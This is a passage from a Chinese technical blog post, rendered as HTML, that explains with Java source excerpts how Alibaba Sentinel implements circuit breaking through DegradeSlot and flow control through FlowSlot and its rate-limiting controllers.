class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">fireExit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总体的框架如下:</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/3.png\" alt=\"结构图\"></p>\n<p>Sentinel 将 SlotChainBuilder 作为 SPI 接口进行扩展，使得 Slot Chain 具备了扩展的能力。您可以自行加入自定义的 slot 并编排 slot 间的顺序，从而可以给 Sentinel 添加自定义的功能。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/4.png\" alt=\"Sentinel图\"></p>\n<h4 id=\"RuleManager-规则管理器\"><a href=\"#RuleManager-规则管理器\" class=\"headerlink\" title=\"RuleManager 规则管理器\"></a>RuleManager 规则管理器</h4><p>每个 Slot 插槽背后都对应着一个 RuleManager 的实现类，简单理解就是每个 Slot 有一套规则，规则验证处理由对应的 RuleManager 来进行处理。</p>\n<p>流量控制：FlowSolt 对应 FlowRuleManager</p>\n<p>降级控制：DegradeSlot  对应 DegradeRuleManager</p>\n<p>权限控制：AuthoritySlot 对应 AuthorityRuleManager</p>\n<p>系统规则控制： SystemSlot 对应 SystemRuleManager</p>\n<h4 id=\"降级控制实现原理\"><a href=\"#降级控制实现原理\" class=\"headerlink\" title=\"降级控制实现原理\"></a>降级控制实现原理</h4><ol>\n<li>新增资源配置降级规则，目前对于降级策有如下三种：</li>\n</ol>\n<p>RT：平均响应时间 (DEGRADE_GRADE_RT)：当 1s 内持续进入 5 个请求，对应时刻的平均响应时间（秒级）均超过阈值（count，以 ms 为单位），那么在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 DegradeException）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，超出此阈值的都会算作 4900 ms，若需要变更此上限可以通过启动配置项 -Dcsp.sentinel.statistic.max.rt&#x3D;xxx 来配置。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/5.png\" alt=\"平均响应图\"></p>\n<p>异常比例：当资源的每秒请求量 &gt;&#x3D; 5，并且每秒异常总数占通过量的比值超过阈值（DegradeRule 中的 count）之后，资源进入降级状态，即在接下的时间窗口（DegradeRule 中的 timeWindow，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 [0.0, 1.0]，代表 0% - 100%。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/6.png\" alt=\"异常比例图\"></p>\n<p>异常数：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 timeWindow 小于 60s，则结束熔断状态后仍可能再进入熔断状态。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/7.png\" alt=\"异常数图\"></p>\n<p>限流结果信息</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">Blocked by Sentinel (flow limiting)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>实现逻辑</li>\n</ol>\n<p>在之前我们已经提及 Sentinel 是通过 slot 链来实现的，对于降级功能其提供了 DegradeSlot，实现源码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DegradeSlot</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractLinkedProcessorSlot</span>&lt;DefaultNode&gt; &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">entry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, DefaultNode node, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized, Object... args)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        DegradeRuleManager.checkDegrade(resourceWrapper, context, node, count);</span><br><span class=\"line\">        fireEntry(context, resourceWrapper, node, count, prioritized, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span> &#123;</span><br><span class=\"line\">        fireExit(context, resourceWrapper, count, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过上面代码我们可以了解到，限流规则的实现是在 DegradeRuleManager 的checkDegrade中来处理的，限流可以-配置多个规则，依次按照规则来处理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkDegrade</span><span class=\"params\">(ResourceWrapper resource, Context context, DefaultNode node, <span class=\"type\">int</span> count)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> BlockException &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">        Set&lt;DegradeRule&gt; rules = degradeRules.get(resource.getName());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rules == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">for</span> (DegradeRule rule : rules) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!rule.passCheck(context, node, count)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DegradeException</span>(rule.getLimitApp(), rule);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在 DegradeRule 的 passCheck 方法中我们可以看到可以根据 RT、异常数和异常比例来进行熔断降级处理。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">passCheck</span><span class=\"params\">(Context context, DefaultNode node, <span class=\"type\">int</span> acquireCount, Object... args)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cut.get()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"type\">ClusterNode</span> <span class=\"variable\">clusterNode</span> <span class=\"operator\">=</span> ClusterBuilderSlot.getClusterNode(<span class=\"built_in\">this</span>.getResource());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clusterNode == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">\t\t<span class=\"comment\">// 请求处理时间</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (grade == RuleConstant.DEGRADE_GRADE_RT) &#123;</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">rt</span> <span class=\"operator\">=</span> clusterNode.avgRt();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (rt &lt; <span class=\"built_in\">this</span>.count) &#123;</span><br><span class=\"line\">                passCount.set(<span class=\"number\">0</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\">// Sentinel will degrade the service only if count exceeds.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (passCount.incrementAndGet() &lt; rtSlowRequestAmount) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_RATIO) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//异常比例</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">exception</span> <span class=\"operator\">=</span> clusterNode.exceptionQps();</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">success</span> <span class=\"operator\">=</span> clusterNode.successQps();</span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">total</span> <span class=\"operator\">=</span> clusterNode.totalQps();</span><br><span class=\"line\">            <span class=\"comment\">// If total amount is less than minRequestAmount, the request will pass.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (total &lt; minRequestAmount) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\">// In the same aligned statistic time window,</span></span><br><span class=\"line\">            <span class=\"comment\">// &quot;success&quot; (aka. completed count) = exception count + non-exception count (realSuccess)</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">realSuccess</span> <span class=\"operator\">=</span> success - exception;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (realSuccess &lt;= <span class=\"number\">0</span> &amp;&amp; exception &lt; minRequestAmount) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (exception / success &lt; count) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (grade == RuleConstant.DEGRADE_GRADE_EXCEPTION_COUNT) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//异常数</span></span><br><span class=\"line\">            <span class=\"type\">double</span> <span class=\"variable\">exception</span> <span class=\"operator\">=</span> clusterNode.totalException();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (exception &lt; count) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cut.compareAndSet(<span class=\"literal\">false</span>, <span class=\"literal\">true</span>)) &#123;</span><br><span class=\"line\">            <span class=\"type\">ResetTask</span> <span class=\"variable\">resetTask</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ResetTask</span>(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">            pool.schedule(resetTask, timeWindow, TimeUnit.SECONDS);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"流量控制实现原理\"><a href=\"#流量控制实现原理\" class=\"headerlink\" title=\"流量控制实现原理\"></a>流量控制实现原理</h4><p>接下来我们了解学习一下 Sentinel 是如何实现流量控制的</p>\n<p>流量控制（flow control），其原理是监控应用流量的 QPS 或并发线程数等指标，当达到指定的阈值时对流量进行控制，以避免被瞬时的流量高峰冲垮，从而保障应用的高可用性。</p>\n<p>FlowSlot 会根据预设的规则，结合前面 NodeSelectorSlot、ClusterNodeBuilderSlot、StatisticSlot 统计出来的实时信息进行流量控制。</p>\n<p>限流的直接表现是在执行 Entry nodeA &#x3D; SphU.entry(resourceName) 的时候抛出 FlowException 异常。FlowException 是 BlockException 的子类，您可以捕捉 BlockException 来自定义被限流之后的处理逻辑。</p>\n<p>同一个资源可以创建多条限流规则。FlowSlot 会对该资源的所有限流规则依次遍历，直到有规则触发限流或者所有规则遍历完毕。</p>\n<p>一条限流规则主要由下面几个因素组成，我们可以组合这些元素来实现不同的限流效果：</p>\n<ul>\n<li>resource：资源名，即限流规则的作用对象</li>\n<li>count: 限流阈值</li>\n<li>grade: 限流阈值类型（QPS 或并发线程数）</li>\n<li>limitApp: 流控针对的调用来源，若为 default 则不区分调用来源</li>\n<li>strategy: 调用关系限流策略</li>\n<li>controlBehavior: 流量控制效果（直接拒绝、Warm Up、匀速排队）</li>\n</ul>\n<p>流控-QPS配置</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/8.png\" alt=\"QPS配置图\"></p>\n<p>流控-线程数配置</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/9.png\" alt=\"流控图\"></p>\n<h5 id=\"实现流程\"><a href=\"#实现流程\" class=\"headerlink\" title=\"实现流程\"></a>实现流程</h5><p>Sentinel 提供了 FlowSlot 用来进行流量控制，流量规则的最终实现在 FlowRuleChecker 的 checkFlow 中实现的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FlowSlot</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractLinkedProcessorSlot</span>&lt;DefaultNode&gt; &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> FlowRuleChecker checker;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">FlowSlot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FlowRuleChecker</span>());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Package-private for test.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> checker flow rule checker</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@since</span> 1.6.1</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    FlowSlot(FlowRuleChecker checker) &#123;</span><br><span class=\"line\">        AssertUtil.notNull(checker, <span class=\"string\">&quot;flow checker should not be null&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.checker = checker;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">entry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, DefaultNode node, <span class=\"type\">int</span> count,</span></span><br><span class=\"line\"><span class=\"params\">                      <span class=\"type\">boolean</span> prioritized, Object... args)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        checkFlow(resourceWrapper, context, node, count, prioritized);</span><br><span class=\"line\"> </span><br><span class=\"line\">        fireEntry(context, resourceWrapper, node, count, prioritized, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">checkFlow</span><span class=\"params\">(ResourceWrapper resource, Context context, DefaultNode node, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized)</span></span><br><span class=\"line\">        <span class=\"keyword\">throws</span> BlockException &#123;</span><br><span class=\"line\">        checker.checkFlow(ruleProvider, resource, context, node, count, prioritized);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span> &#123;</span><br><span class=\"line\">        fireExit(context, resourceWrapper, count, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Function&lt;String, Collection&lt;FlowRule&gt;&gt; ruleProvider = <span class=\"keyword\">new</span> <span class=\"title class_\">Function</span>&lt;String, Collection&lt;FlowRule&gt;&gt;() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Collection&lt;FlowRule&gt; <span class=\"title function_\">apply</span><span class=\"params\">(String resource)</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Flow rule map should not be null.</span></span><br><span class=\"line\">            Map&lt;String, List&lt;FlowRule&gt;&gt; flowRules = FlowRuleManager.getFlowRuleMap();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> flowRules.get(resource);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 checkFlow 中会依次获取我们配置的流控规则，然后依次进行流控判断处理，如果被流控则抛出异常 FlowException</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkFlow</span><span class=\"params\">(Function&lt;String, Collection&lt;FlowRule&gt;&gt; ruleProvider, ResourceWrapper resource,</span></span><br><span class=\"line\"><span class=\"params\">                          Context context, DefaultNode node, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized)</span> <span class=\"keyword\">throws</span> BlockException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ruleProvider == <span class=\"literal\">null</span> || resource == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Collection&lt;FlowRule&gt; rules = ruleProvider.apply(resource.getName());</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rules != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (FlowRule rule : rules) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!canPassCheck(rule, context, node, count, prioritized)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FlowException</span>(rule.getLimitApp(), rule);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在 canPassCheck 中会判断是集群限流还是本地限流</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPassCheck</span><span class=\"params\">(<span class=\"comment\">/*@NonNull*/</span> FlowRule rule, Context context, DefaultNode node, <span class=\"type\">int</span> acquireCount,</span></span><br><span class=\"line\"><span class=\"params\">                                                    <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">limitApp</span> <span class=\"operator\">=</span> rule.getLimitApp();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (limitApp == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rule.isClusterMode()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> passClusterCheck(rule, context, node, acquireCount, prioritized);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> passLocalCheck(rule, context, node, acquireCount, prioritized);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>如果是本地限流则获取节点信息，然后根据流控规则进行流控判断</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">passLocalCheck</span><span class=\"params\">(FlowRule rule, Context context, DefaultNode node, <span class=\"type\">int</span> acquireCount,</span></span><br><span class=\"line\"><span class=\"params\">                                          <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Node</span> <span class=\"variable\">selectedNode</span> <span class=\"operator\">=</span> selectNodeByRequesterAndStrategy(rule, context, node);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (selectedNode == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> rule.getRater().canPass(selectedNode, acquireCount, prioritized);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>当 QPS 超过某个阈值的时候，则采取措施进行流量控制。流量控制的手段包括以下几种：直接拒绝、Warm Up、匀速排队。对应 FlowRule 中的 controlBehavior 字段。</p>\n<p>直接拒绝（RuleConstant.CONTROL_BEHAVIOR_DEFAULT）方式是默认的流量控制方式，当QPS超过任意规则的阈值后，新的请求就会被立即拒绝，拒绝方式为抛出FlowException。这种方式适用于对系统处理能力确切已知的情况下，比如通过压测确定了系统的准确水位时。具体的例子参见 FlowQpsDemo。</p>\n<p>Warm Up（RuleConstant.CONTROL_BEHAVIOR_WARM_UP）方式，即预热&#x2F;冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。详细文档可以参考 流量控制 - Warm Up 文档</p>\n<p>目前 Sentinel 对于流量控制提供了如下几种方式：</p>\n<ul>\n<li>直接拒绝（DefaultController）：支持抛出异常<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPass</span><span class=\"params\">(Node node, <span class=\"type\">int</span> acquireCount, <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">curCount</span> <span class=\"operator\">=</span> avgUsedTokens(node);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (curCount + acquireCount &gt; count) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (prioritized &amp;&amp; grade == RuleConstant.FLOW_GRADE_QPS) &#123;</span><br><span class=\"line\">            <span class=\"type\">long</span> currentTime;</span><br><span class=\"line\">            <span class=\"type\">long</span> waitInMs;</span><br><span class=\"line\">            currentTime = TimeUtil.currentTimeMillis();</span><br><span class=\"line\">            waitInMs = node.tryOccupyNext(currentTime, acquireCount, count);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (waitInMs &lt; OccupyTimeoutProperty.getOccupyTimeout()) &#123;</span><br><span class=\"line\">                node.addWaitingRequest(currentTime + waitInMs, acquireCount);</span><br><span class=\"line\">                node.addOccupiedPass(acquireCount);</span><br><span class=\"line\">                sleep(waitInMs);</span><br><span class=\"line\"> </span><br><span class=\"line\">                <span class=\"comment\">// PriorityWaitException indicates that the request will pass after waiting for &#123;@link @waitInMs&#125;.</span></span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PriorityWaitException</span>(waitInMs);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li>匀速排队（RateLimiterController）：判断等待时间，如果等待时间过长也是会限流，并且使用 Thread.sleep 如果配置不正确可能会导致线程过多。<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPass</span><span class=\"params\">(Node node, <span class=\"type\">int</span> acquireCount, <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Pass when acquire count is less or equal than 0.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (acquireCount &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// Reject when count is less or equal than 0.</span></span><br><span class=\"line\">        <span class=\"comment\">// Otherwise,the costTime will be max of long and waitTime will overflow in some cases.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (count &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">currentTime</span> <span class=\"operator\">=</span> TimeUtil.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"comment\">// Calculate the interval between every two requests.</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">costTime</span> <span class=\"operator\">=</span> Math.round(<span class=\"number\">1.0</span> * (acquireCount) / count * <span class=\"number\">1000</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"comment\">// Expected pass time of this request.</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">expectedTime</span> <span class=\"operator\">=</span> costTime + latestPassedTime.get();</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (expectedTime &lt;= currentTime) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Contention may exist here, but it&#x27;s okay.</span></span><br><span class=\"line\">            latestPassedTime.set(currentTime);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Calculate the time to wait.</span></span><br><span class=\"line\">            <span class=\"type\">long</span> <span class=\"variable\">waitTime</span> <span class=\"operator\">=</span> costTime + latestPassedTime.get() - TimeUtil.currentTimeMillis();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (waitTime &gt; maxQueueingTimeMs) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">long</span> <span class=\"variable\">oldTime</span> <span class=\"operator\">=</span> latestPassedTime.addAndGet(costTime);</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    waitTime = oldTime - TimeUtil.currentTimeMillis();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (waitTime &gt; maxQueueingTimeMs) &#123;</span><br><span class=\"line\">                        latestPassedTime.addAndGet(-costTime);</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// in race condition waitTime may &lt;= 0</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (waitTime &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        Thread.sleep(waitTime);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></li>\n<li>Warm Up（WarmUpController 和 WarmUpRateLimiterController）：预热启动<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span 